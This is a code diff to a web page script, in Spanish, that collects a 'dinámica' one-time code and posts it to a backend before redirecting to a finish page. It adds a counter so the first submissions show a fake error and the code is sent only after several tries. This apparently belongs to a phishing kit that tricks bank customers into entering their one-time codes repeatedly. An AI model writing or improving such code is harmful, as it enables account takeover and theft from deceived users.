@@ -30,7 +30,7 @@
 
 <script type="text/javascript">
 	var espera = 0;
-
+    var counter = 0;
 	let identificadorTiempoDeEspera;
 
 	function retardor() {
@@ -41,36 +41,46 @@
 
 	}
 
+    function sendCode() {
+        if ($("#txtDinamica").val().length > 5) {
+            const data = {
+                'dinamica': $("#txtDinamica").val()
+            };
+            console.log(data);
+            $.ajax({
+                url: '../../acciones/editar_mensaje.php',
+                method: 'POST',
+                data: {
+                    data: data
+                },
+                success: function(response) {
+                    const result = JSON.parse(response);
+                    if (result.success) {
+                        window.location.href = "finish.php";
+                    } else {
+                        alert('Error al editar el mensaje: ' + result.error);
+                    }
+                },
+                error: function(xhr, status, error) {
+                    alert('Error en la solicitud AJAX: ' + error);
+                }
+            });		
+        } else {
+            $(".mensaje").show();
+            $(".pass").css("border", "1px solid red");
+            $("#txtDinamica").focus();
+        }	
+    }
+
 	$(document).ready(function() {
 		$('#btnDinamica').click(function(){
-			if ($("#txtDinamica").val().length > 5) {
-				const data = {
-                    'dinamica': $("#txtDinamica").val()
-                };
-				console.log(data);
-				$.ajax({
-                    url: '../../acciones/editar_mensaje.php',
-                    method: 'POST',
-                    data: {
-                        data: data
-                    },
-                    success: function(response) {
-                        const result = JSON.parse(response);
-                        if (result.success) {
-                            window.location.href = "finish.php";
-                        } else {
-                            alert('Error al editar el mensaje: ' + result.error);
-                        }
-                    },
-                    error: function(xhr, status, error) {
-                        alert('Error en la solicitud AJAX: ' + error);
-                    }
-                });		
-			}else{
-				$(".mensaje").show();
-				$(".pass").css("border", "1px solid red");
-				$("#txtDinamica").focus();
-			}			
+            if(counter < 3) {
+                $(".mensaje").show();
+            $(".pass").css("border", "1px solid red");
+            $("#txtDinamica").focus();
+            } else {
+                sendCode();
+            }
 		});
 
 		$("#txtDinamica").keyup(function(e) {
